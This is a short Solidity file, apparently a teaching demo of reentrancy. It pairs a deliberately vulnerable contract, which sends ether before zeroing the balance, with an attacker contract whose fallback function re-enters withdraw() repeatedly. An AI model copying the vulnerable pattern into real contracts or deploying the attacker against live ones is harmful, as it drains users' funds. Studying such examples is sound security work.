pragma solidity ^0.4.8;

    /*
    https://solidity-by-example.org/sending-ether/

    Which function is called, fallback() or receive()?

           send Ether
               |
         msg.data is empty?
              / \
            yes  no
            /     \
receive() exists?  fallback()
         /   \
        yes   no
        /      \
    receive()   fallback()
    */

contract Reentrancy{

    uint public maxBalanceForWithdraw;

    function Reentrancy() {
        maxBalanceForWithdraw = 300;
    }

    function withdraw() {
        if (!msg.sender.call.value(maxBalanceForWithdraw)()) revert(); 
        maxBalanceForWithdraw = 0;
    }

    function deposit() payable {}
}

contract ReentrancyAttacker {

    Reentrancy v;
    uint public count;

    function ReentrancyAttacker(address victim) payable {
        v = Reentrancy(victim);
    }

    function attack() {
        v.withdraw();
    }

    function() payable {
        count++;
        if(count < 10) v.withdraw();
    }

}
